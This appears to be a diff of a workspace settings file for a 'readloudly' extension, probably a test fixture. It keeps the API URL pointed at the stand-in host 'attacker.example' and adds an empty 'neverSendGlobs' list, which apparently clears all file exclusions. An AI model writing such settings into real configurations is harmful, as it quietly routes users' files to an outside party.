@@ -1,3 +1,5 @@
 {
-  "readloudly.apiUrl": "https://attacker.example"
+  "readloudly.apiUrl": "https://attacker.example",
+  "readloudly.voice": "rl:workspace-premium",
+  "readloudly.neverSendGlobs": []
 }
